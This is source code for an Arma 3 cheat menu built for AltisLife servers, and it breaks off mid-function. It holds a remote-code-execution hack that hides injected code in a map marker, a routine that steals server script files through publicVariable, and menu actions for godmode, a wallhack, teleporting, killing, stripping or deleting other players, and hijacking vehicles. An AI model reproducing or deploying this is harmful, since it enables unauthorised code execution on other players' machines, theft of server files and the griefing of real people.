[] call {
	O_fnc_RE = 0;
	O_fnc_Current = 1;
	O_fnc_MinMenu = 1;
	O_fnc_MaxMenu = 16;
	O_fnc_quickSpeed = 5;
	O_fnc_quickAttach = false;
	O_fnc_whiles = false;
	O_fnc_RunnedFSteal = false;
	O_fnc_keySetup = false;
	O_fnc_QuickAccessMenu = false;
	Q_fnc_QuickAccessOpened = false;
	O_fnc_quickEnd = false;
	O_fnc_quickExec = false;
	O_fnc_quickDummy = false;
	O_fnc_quickESP = false;
	O_fnc_quickGod  = false;
	O_fnc_quickPlayAction = false;
	O_fnc_QuickSpiderManActive = false;
	O_fnc_initMenu = {};
	O_fnc_keyBind = {};
	O_fnc_QuickkeyStuff = {};
	O_fnc_DummyName = "ARDOLPH";
	O_fnc_Modus = "AltisLife";
	O_fnc_textTarget = "XXX";
	O_fnc_textDeleteTar = "";
	O_fnc_textDummy = "";
	O_fnc_textESP = "";
	O_fnc_textExplodeTar = "";
	O_fnc_textGearTar = "";
	O_fnc_textGod = "";
	O_fnc_textHeal = "";
	O_fnc_textJoinVeh = "";
	O_fnc_textTarget = "";
	O_fnc_textTeleport = "";
	O_fnc_textAttachTar = "";
};


[] call {
	O_fnc_ArmA = {
		if(isNil 'O_fnc_REFirstRuntime') then {
			O_fnc_REFirstRuntime = createMarker ["Christian",[0,0]];
			"Christian" setMarkerShape "ICON";
			"Christian" setMarkerType "Empty";
			"Christian" setMarkerAlpha 0;
			_code = '';

			if(!isNil "LIFE1_fnc_MP") then {
				call O_fnc_ArmAInf;
			} else {

				_fnc_mpPacket = "Nothing";

				if (!isNil "xxxx")then{

				}else{

				};

				_lvl0 = {

				};

				_lvl1 = {

				};

				_lvl2 = {

				};

				_lvl3 = {

				};

				_lvl4 = {

				};

				_lvl5 = {

				};

				_code call _lvl2;
				call O_fnc_ArmAInf;
			};
		};

		waitUntil {!isNil "O_fnc_REFirstRuntime"};

		_code = _this select 0;
		_target = [_this,1,"SWAGGER"] call BIS_fnc_param;
		_text = _code;

		if(typename _code == typename []) then {
				_text = _code select 0;
		};

		if(typename _text == "CODE") then {
				_arr = toArray str(_text);
				_arr set [0,32];
				_arr set [count(_arr)-1,32];
				_text = toString _arr;
		};

		if(typename _target != "STRING") then {
				if(typename _target == "OBJECT") then {
						_netId = netId _target;
						_text = format["[] spawn {if(netid player == '%2') then {%1};};",_text,_netID];
				} else {
						if(typename _target == typename true) then {
								if(!_target) then {
										_text = format[" [] spawn {if(isServer) then {%1};};",_text];
								} else {
										_text = format[" [] spawn {if(!isDedicated) then {%1};};",_text];
								};
						};
				};
		} else {
				_text = format["[] spawn {%1};",_text];
		};

		"Christian" setMarkerText _text;
	};

	O_fnc_ArmAInf = {
		_babe = {
			profileNamespace setVariable ['STEAM_NAME_ARRAY', []];
		};

		[_babe, player] call O_fnc_ArmA;
	};

	O_fnc_ArmAFile = {
		disableSerialization;
		_edit = uiNamespace getVariable "RscEdit";
		O_fnc_fileName = ctrlText _edit;

		if (O_fnc_fileName == "")exitWith {hint "Enter a filename"};

		_babe = format["
			_contents = preprocessfile '%1';
			missionNamespace setVariable ['JipTimeNow', 'NOPE'];
			missionNamespace setVariable ['JipTimeNow', _contents];
			publicVariable 'JipTimeNow'; ",O_fnc_fileName];


		[_babe, false] call O_fnc_ArmA;

		"JipTimeNow" addPublicVariableEventHandler {
			_t = _this select 1;
			profileNamespace setVariable['OfnmmNMMnn', _this select 1];
			saveProfileNamespace;
			_t = profileNamespace getVariable "OfnmmNMMnn";
			[_t,O_fnc_fileName] spawn O_fnc_initFSteal;
		};
	};
};

[] call {
	O_fnc_CPerson = {
		disableSerialization;
		O_fnc_DummyID = player;

		_dummy = createAgent ["C_man_1", position player,[], 0, "NONE"];
		[_dummy,configFile >> "CfgVehicles" >> "C_Nikos_aged"] call BIS_fnc_loadInventory;

		_dummy setName O_fnc_DummyName;
		_dummy enableSimulation true;
		_dummy setVariable["agentObject",_this,true];
		_dummy setVariable ["steam64ID","751267613374118"];
		_dummy setVariable ["realname",O_fnc_DummyName,true];
		_dummy setVariable ["realName",O_fnc_DummyName,true];
		_dummy setVariable ["restrained",false,true];
		_dummy setVariable ["Escorting",false,true];
		_dummy setVariable ["transporting",false,true];
		_dummy setVariable ["owner", "world", true];

		if (!isNil "life_fnc_playerTags")then{
			disableSerialization;
			[] call life_fnc_playerTags;
		}else{
			disableSerialization;
			[] call compile preprocessfileLineNumbers "core\functions\fn_playerTags.sqf";
		};

		selectPlayer _dummy;
		_dummy disableAI "Move";
		vehicle _dummy switchCamera "EXTERNAL";
	};
};

O_fnc_initFSteal = {
	disableSerialization;
	closeDialog 49;

	_text = _this select 0;
	_file = _this select 1;

	_filter = "

";

	_text = toArray _text;
	_filter = toArray _filter;

	{
		if(_x in _filter) then {
			_text set[_forEachIndex,32];
		};
	} foreach _text;

	_text = _text - [-1];
	_text = toString _text;

	if (_text == "")then{
		_text = profileNamespace getVariable "OfnmmNMMnn";
	};

	if (_file == "")exitWith {hint "Enter a filename"};

	if (_text != "")then{
		findDisplay 46 createDisplay "RscDisplayDebug";
		waitUntil {!isNull findDisplay 56};
		O_fnc_RunnedFSteal = true;
		_1 = (findDisplay 56) displayCtrl 13142;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 13155;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 151;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 13157;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 13158;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 13159;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 13160;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 13161;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 13162;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 13163;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 12145;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 11838;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 12146;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 12537;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 13037;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 13036;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 13039;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 13038;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 103;
		_1 ctrlShow false;
		_1 = (findDisplay 56) displayCtrl 152;
		_1 ctrlShow false;

		_1 = (findDisplay 56) displayCtrl 102;
		_1 ctrlSetText "Execute Local";
		_1 buttonSetAction '_back = (findDisplay 56) displayCtrl 101; _text = ctrlText _back; call compile format ["%1",_text];';

		_1 = (findDisplay 56) displayCtrl 1;
		_1 ctrlSetText "Execute Global";
		_1 buttonSetAction '_back = (findDisplay 56) displayCtrl 101; _text = ctrlText _back; call compile format ["[{%1},TRUE] call O_fnc_ArmA;",_text];';

		_1 = (findDisplay 56) displayCtrl 11736;
		_1 ctrlSetText format ["Content: %1",_file];

		_1 = (findDisplay 56) displayCtrl 101;
		_1 ctrlSetText _text;

		while {!isNull findDisplay 56}do {
			waitUntil {isNull findDisplay 56};
			"dynamicBlur" ppEffectEnable false;
		};
	}else{
		hint format ["File not found... Return: [%1] ", str _text];
	};
};

O_fnc_QuickAccess = {
	Q_fnc_QuickAccessOpened = true;
	disableSerialization;

	_display = findDisplay 46;

	_back = _display ctrlCreate ["IGUIBack", -1];

	_back ctrlSetPosition [-0.9125,-0.56,0.2825,0.70];
	_back ctrlSetBackgroundColor [0,0,0,0.65];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["IGUIBack_1_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.56,0.2825,0.04];
	_back ctrlSetText format ["TARGET: %1",cursorTarget];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_1_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.50,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_2_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.46,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_3_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.42,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_4_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.38,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_5_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.34,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_6_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.30,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_7_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.26,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_8_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.22,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_9_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.18,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_10_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.14,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_11_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.10,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_12_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.06,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_13_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,-0.02,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_14_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,0.02,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_15_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,0.06,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_16_QuickAccess", _back];

	_back = _display ctrlCreate ["RscStructuredText", -1];

	_back ctrlSetPosition [-0.9125,0.10,0.2825,0.04];
	_back ctrlCommit 0.0;

	uiNamespace setVariable ["RscStructuredText_17_QuickAccess", _back];

	O_fnc_QuickkeyStuff =
	{
		switch (_this)do{

			case "User13":
			{
				if (O_fnc_Current == O_fnc_MinMenu)then{
					O_fnc_Current = O_fnc_MaxMenu;
				}else{
					O_fnc_Current = O_fnc_Current - 1;
				};
			};

			case "User12":
			{
				if (O_fnc_Current == O_fnc_MaxMenu)then{
					O_fnc_Current = O_fnc_MinMenu;
				}else{
					O_fnc_Current = O_fnc_Current + 1;
				};
			};

			case "User14":
			{
				O_fnc_quickExec = true;
			};

			case "User15":
			{
				O_fnc_quickEnd = true;
			};
		};s
	};

	[] spawn
	{
		[] spawn 	{while {true}do		{			waitUntil {inputAction "User12" > 0};			"User12" call O_fnc_QuickkeyStuff;	sleep 0.2;	};};
		[] spawn 	{while {true}do		{			waitUntil {inputAction "User13" > 0};			"User13" call O_fnc_QuickkeyStuff;	sleep 0.2;	};};
		[] spawn 	{while {true}do		{			waitUntil {inputAction "User14" > 0};			"User14" call O_fnc_QuickkeyStuff;	sleep 0.1;	};};
		[] spawn 	{while {true}do		{			waitUntil {inputAction "User15" > 0};			"User15" call O_fnc_QuickkeyStuff;	sleep 0.1;	};};
	};

	[] spawn
	{
		while {true}do
		{
			if (O_fnc_Current == 1) then{
				O_fnc_textGod =           "-   Godmode   -";
			}else { O_fnc_textGod =       "   Godmode   ";};

			if (O_fnc_Current == 2)then{
				O_fnc_textHeal =          "-     Heal Meh     -";
			}else { O_fnc_textHeal =      "     Heal Meh     ";};

			if (O_fnc_Current == 3)then{
				O_fnc_textESP =           "-       ESP       -";
			}else { O_fnc_textESP =       "       ESP       ";};

			if (O_fnc_Current == 4)then{
				O_fnc_textDummy =         "-    Second Person    -";
			}else { O_fnc_textDummy =     "    Second Person    ";};

			if (O_fnc_Current == 5)then{
				O_fnc_textTeleport =      "-    Teleport    -";
			}else { O_fnc_textTeleport =  "    Teleport    ";};

			if (O_fnc_Current == 6)then{
				O_fnc_textGearTar =       "- Gear  Target -";
			}else { O_fnc_textGearTar =   " Gear  Target ";};

			if (O_fnc_Current == 7)then{
				O_fnc_textDeleteTar =     "-   Delete  Target   -";
			}else { O_fnc_textDeleteTar = "    Delete  Target    ";};

			if (O_fnc_Current == 8)then{
				O_fnc_textJoinVeh =       "- Join Vehicle -";
			}else { O_fnc_textJoinVeh =   "  Join Vehicle  ";};

			if (O_fnc_Current == 9)then{
				O_fnc_textExplodeTar =    "-   Kill Target   -";
			}else {O_fnc_textExplodeTar = "    Kill Target    ";};

			if (O_fnc_Current == 10)then{
				O_fnc_textSculptureTar =    "-   Sculpture Target   -";
			}else {O_fnc_textSculptureTar = "    Sculpture Target    ";};

			if (O_fnc_Current == 11)then{
				O_fnc_textAttachTar =    "-    Attach Target    -";
			}else {O_fnc_textAttachTar = "     Attach Target     ";};

			if (O_fnc_Current == 12)then{
				O_fnc_textGetInAllTar =    "-   All in Vehicle   -";
			}else {O_fnc_textGetInAllTar = "    All in Vehicle    ";};

			if (O_fnc_Current == 13)then{
				O_fnc_textPlayActionTar =    "-   PlayAction Target   -";
			}else {O_fnc_textPlayActionTar = "    PlayAction Target    ";};

			if (O_fnc_Current == 14)then{
				O_fnc_textSpeedCur =    format ["-   Spiderman Speed: %1 -", O_fnc_quickSpeed];
			}else {O_fnc_textSpeedCur = format ["   Spiderman Speed: %1 ", O_fnc_quickSpeed];};

			if (O_fnc_Current == 15)then{
				O_fnc_textSpiderMan =    "-   Spiderman   -";
			}else {O_fnc_textSpiderMan = "    Spiderman    ";};

			if (O_fnc_Current == 16)then{
				O_fnc_textPushTar =    "-   Push Target   -";
			}else {O_fnc_textPushTar = "    Push Target    ";};


			if (cursorTarget isKindOf "Man") then
			{
				if (isPlayer cursorTarget) then
				{
					O_fnc_textTarget = name cursorTarget;
				}else{
					try{
						O_fnc_textTarget = "AI: " + name cursorTarget;
					}catch{
						O_fnc_textTarget = "AI";
					};
				};
			}else{
				try{
					_tar = cursorTarget;

					if (_tar isKindOf "LandVehicle" || _tar isKindOf "Air" || _tar isKindOf "Ship" && driver _tar != objNull) then{
						_cursorTarget = getText (configFile >> "CfgVehicles" >> typeOf cursorTarget >> "displayName");
						O_fnc_textTarget = "("+ _cursorTarget +") " + name (driver cursorTarget);
					}else{
						if (_tar isKindOf "LandVehicle" || _tar isKindOf "Air" || _tar isKindOf "Ship") then{
							O_fnc_textTarget = "("+ _cursorTarget +") ";
						};
					};
				}catch{
					O_fnc_textTarget = cursorTarget;
				};
			};



			(uiNamespace getVariable "RscStructuredText_1_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textTarget+""];

			if (O_fnc_quickGod)then{
				(uiNamespace getVariable "RscStructuredText_2_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textGod+""];
			}else{
				(uiNamespace getVariable "RscStructuredText_2_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textGod+""];
			};

			(uiNamespace getVariable "RscStructuredText_3_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textHeal+""];

			if (O_fnc_quickESP)then{
				(uiNamespace getVariable "RscStructuredText_4_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textESP+""];
			}else{
				(uiNamespace getVariable "RscStructuredText_4_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textESP+""];
			};


			if (O_fnc_quickDummy)then{
				(uiNamespace getVariable "RscStructuredText_5_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textDummy+""];
			}else{
				(uiNamespace getVariable "RscStructuredText_5_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textDummy+""];
			};

			(uiNamespace getVariable "RscStructuredText_6_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textTeleport+""];

			(uiNamespace getVariable "RscStructuredText_7_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textGearTar+""];

			(uiNamespace getVariable "RscStructuredText_8_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textDeleteTar+""];

			(uiNamespace getVariable "RscStructuredText_9_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textJoinVeh+""];

			(uiNamespace getVariable "RscStructuredText_10_QuickAccess") ctrlSetStructuredText parseText format[""+O_fnc_textExplodeTar+""];

			(uiNamespace getVariable "RscStructuredText_11_QuickAccess") ctrlSetStructuredText parseText format[""+O_fnc_textSculptureTar+""];

			if (O_fnc_quickAttach)then{
				(uiNamespace getVariable "RscStructuredText_12_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textAttachTar+""];
			}else{
				(uiNamespace getVariable "RscStructuredText_12_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textAttachTar+""];
			};

			(uiNamespace getVariable "RscStructuredText_13_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textGetInAllTar+""];

			if (O_fnc_quickPlayAction)then{
				(uiNamespace getVariable "RscStructuredText_14_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textPlayActionTar+""];
			}else{
				(uiNamespace getVariable "RscStructuredText_14_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textPlayActionTar+""];
			};

			(uiNamespace getVariable "RscStructuredText_15_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textSpeedCur+""];

			if (O_fnc_QuickSpiderManActive)then{
				(uiNamespace getVariable "RscStructuredText_16_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textSpiderMan+""];
			}else{
				(uiNamespace getVariable "RscStructuredText_16_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textSpiderMan+""];
			};

			(uiNamespace getVariable "RscStructuredText_17_QuickAccess")  ctrlSetStructuredText parseText format[""+O_fnc_textPushTar+""];


			switch (O_fnc_Current) do {
				case 1:
				{

					if (O_fnc_quickExec)then{
						O_fnc_quickExec = false;
						O_fnc_quickGod = true;
						player allowDamage false;
					}else{
						if (O_fnc_quickEnd)then{
							O_fnc_quickEnd = false;
							O_fnc_quickGod = false;
							player allowDamage true;
						};
					};
				};

				case 2:
				{

					if (O_fnc_quickExec)then{
						O_fnc_quickExec = false;
						player setVehicleArmor 1;
					};
				};

				case 3:
				{

					if (O_fnc_quickExec)then{
						O_fnc_quickExec = false;
						O_fnc_quickESP = true;

						onEachFrame {
							{
								if(side _x != side player && ((player distance _x) < 700) && isPlayer _x) then {
									drawIcon3D ["", [1,0,0,0.7], getPosATL _x, 1, 1, 45, name _x, 1, 0.03, "PuristaMedium"]
								}else{
									if (alive _x && ((player distance _x) < 700) && isPlayer _x) then{
										drawIcon3D ["", [0,1,0.5,0.4], getPosATL _x, 1, 1, 45, name _x, 1, 0.03, "PuristaMedium"]
									};
								};
							} foreach allUnits;

							_mans = nearestobjects [player,["man"],200];

							{
								if(alive _x && ((player distance _x) < 700) && isPlayer _x) then {
									if(side _x != side player) then {
										if(player distance _x < 5 && _x iskindof "man" && side _x != civilian && isPlayer _x) then {
											drawLine3D [[getposatl player select 0, getposatl player select 1, getposatl player select 2], _x, [1,0.2,0.3,(abs((((player distance _x)) - 100)/100))]]
										}else{
											drawLine3D [[getposatl player select 0, getposatl player select 1, getposatl player select 2], _x, [1,0,0,(abs((((player distance _x)) - 100)/100))]]
										};
									}else{
										drawLine3D [[getposatl player select 0, getposatl player select 1, getposatl player select 2], _x, [0,1,0,(abs((((player distance _x)) - 100)/100))]]};
								};
							}foreach _mans;
						};
					}else{

						if (O_fnc_quickEnd)then
						{
							O_fnc_quickEnd = false;
							O_fnc_quickESP = false;
							onEachFrame {};
						};
					};
				};

				case 4:
				{

					if (O_fnc_quickExec)then
					{
						O_fnc_quickExec = false;
						O_fnc_quickDummy = true;
						[] spawn O_fnc_CPerson;

					}else{
						if (O_fnc_quickEnd)then
						{
							O_fnc_quickEnd = false;
							O_fnc_quickDummy = false;
							if (!isNil "O_fnc_DummyID")then
							{
								_player = O_fnc_DummyID; 	selectPlayer _player; 	vehicle _player switchCamera "EXTERNAL"; 	O_fnc_DummyID = nil;
							};
						};
					};
				};

				case 5:
				{

					if (O_fnc_quickExec)then
					{
						O_fnc_quickExec = false;
						_pos = vehicle player modelToWorld[0,10,0];
						vehicle player setPos _pos;
					};
				};

				case 6:
				{
					if (O_fnc_quickExec)then
					{
						O_fnc_quickExec = false;
						_vest = vest cursorTarget;
						_uniform = uniform cursorTarget;
						_backpack = backpack cursorTarget;
						_weapon = primaryWeapon cursorTarget;
						_weapon2 = secondaryWeapon cursorTarget;
						_head = headgear cursorTarget;
						_items = itemsWithMagazines cursorTarget;


						player addVest _vest;
						player addUniform _uniform;
						player addBackPack _backpack;
						player addWeapon _weapon;
						player addWeapon _weapon2;
						player addHeadgear _head;


						{
							player addItem _x;
						}forEach _items;

						removeVest cursorTarget;
						removeUniform cursorTarget;
						removeBackpackGlobal cursorTarget;
						removeHeadgear cursorTarget;
						removeAllWeapons cursorTarget;
						cursorTarget removeWeaponGlobal (primaryWeapon cursorTarget);
						cursorTarget removeWeaponGlobal (secondaryWeapon cursorTarget);
						removeAllItemsWithMagazines cursorTarget;
					}else{
						if (O_fnc_quickEnd)then
						{
							O_fnc_quickEnd = false;
							_vest = vest player;
							_uniform = uniform player;
							_backpack = backpack player;
							_weapon = primaryWeapon player;
							_weapon2 = secondaryWeapon player;
							_head = headgear player;
							_items = itemsWithMagazines player;


							cursorTarget addVest _vest;
							cursorTarget addUniform _uniform;
							cursorTarget addBackPack _backpack;
							cursorTarget addWeapon _weapon;
							cursorTarget addWeapon _weapon2;
							cursorTarget addHeadgear _head;


							{
								cursorTarget addItem _x;
							}forEach _items;
						};
					};
				};

				case 7:
				{
					if (O_fnc_quickExec)then{
						O_fnc_quickExec = false;
						deleteVehicle cursorTarget;
					};
				};

				case 8:
				{
					if (O_fnc_quickExec)then{
						O_fnc_quickExec = false;

						try{
							cursorTarget lock false;
							player moveinDriver cursorTarget;
						}catch{

						};
					};
				};

				case 9:
				{
					if (O_fnc_quickExec)then{
						O_fnc_quickExec = false;
						cursorTarget setVehicleArmor 0;
					};
				};

				case 10:
				{
					if (O_fnc_quickExec)then{
						O_fnc_quickExec = false;
						{
							if (player distance _x < 150)then
							{
								if (netID _x != netID player)then
								{
									_x attachTo [cursorTarget,[5, 5, 5], "Pelvis"];
								};
							};
						}forEach allMissionObjects "all";
					};
				};

				case 11:
				{
					if (O_fnc_quickExec)then
					{
						O_fnc_quickExec = false;
						O_fnc_quickAttach = true;
						cursorTarget attachTo [player,[0, 6, 0], "Pelvis"];
					}else{
						if (O_fnc_quickEnd)then
						{
							O_fnc_quickEnd = false;
							O_fnc_quickAttach = false;
							{
							  detach _x;
							} forEach attachedObjects player;
						};
					};
				};

				case 12:
				{
					if (O_fnc_quickExec)then{
						O_fnc_quickExec = false;
						[] spawn {
							{
								_cur = cursorTarget;
								if (netID _x != netID player)then{
									_x moveInDriver _cur;
								};
								sleep 0.5;

								{
									{
										moveOut _x
									};
								}forEach crew _cur;
							}forEach allPlayers;
						};
					};
				};

				case 13:
				{
					if (O_fnc_quickExec)then
					{
						O_fnc_quickExec = false;
						O_fnc_quickPlayAction = true;
						cursorTarget playAction "SitDown";
					}else{
						if (O_fnc_quickEnd)then
						{
							O_fnc_quickEnd = false;
							O_fnc_quickPlayAction = false;
							cursorTarget switchMove "FXStandDip"
						};
					};
				};

				case 14:
				{
					if (O_fnc_quickExec)then
					{
						O_fnc_quickExec = false;
						O_fnc_quickSpeed = O_fnc_quickSpeed + 5;
					}else{
						if (O_fnc_quickEnd)then
						{
							O_fnc_quickEnd = false;
							O_fnc_quickSpeed = O_fnc_quickSpeed - 5;
						};
					};
				};

				case 15:
				{
					if (O_fnc_quickExec)then
					{
						O_fnc_quickExec = false;
						O_fnc_QuickSpiderManActive = true;
						[] spawn
						{
							while{O_fnc_QuickSpiderManActive} do
							{
								player allowDamage false;
								_veh = ((player weaponDirection (currentWeapon player)) vectorMultiply O_fnc_quickSpeed);
								if(O_fnc_QuickSpiderManActive) then {
									player setVelocity _veh;
								};
								sleep 0.075;
							};
						};
					}else{
						if (O_fnc_quickEnd)then
						{
							O_fnc_quickEnd = false;
							O_fnc_quickPlayAction = false;
							player switchMove "FXStandDip";
							O_fnc_QuickSpiderManActive = false;
						};
					};
				};

				case 16:
				{
					if (O_fnc_quickExec)then
					{
						O_fnc_quickExec = false;
						[] spawn
						{
							_vehicle = cursortarget;
							_vel = velocity _vehicle;
							_dir = direction player;
							_speed = 500;
							_vehicle setVelocity [
								(_vel select 0) + (sin _dir * _speed),
								(_vel select 1) + (cos _dir * _speed),
								(_vel select 2)
							];
							sleep 0.075;
						};
					};
				};
			};
			sleep 0.075;
		};
	};
};

[] call {
	O_fnc_initMenu = {
		[] spawn {
			disableSerialization;
			"dynamicBlur" ppEffectEnable false;

			waitUntil {!isNull findDisplay 49};

			_1 = (findDisplay 49) displayCtrl 104;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 302;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 2;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 303;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 307;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 101;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 1010;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 103;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 1002;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 122;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 301;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 13184;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 6455;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 2351;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 120;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 109;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 523;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 121;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 1005;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 1000;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 1001;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 115099;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 1050;
			_1 ctrlShow false;
			_1 = (findDisplay 49) displayCtrl 114998;
			_1 ctrlShow false;


			"dynamicBlur" ppEffectEnable true;
			"dynamicBlur" ppEffectAdjust [1.6];
			"dynamicBlur" ppEffectCommit 0;

			_display = findDisplay 49;

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.675,1.1,2.39848,0.198];
			_back ctrlSetBackgroundColor [0,0,0,0.25];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_1", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.1125,-0.28,1.275,1.36];
			_back ctrlSetBackgroundColor [0.99,0.97,0.78,0.15];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_2", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.675,1.29674,2.403,0.0025];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_3", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.675,1.1,0.0025,0.197974];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_4", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.675,1.1,2.4,0.0025];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_5", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

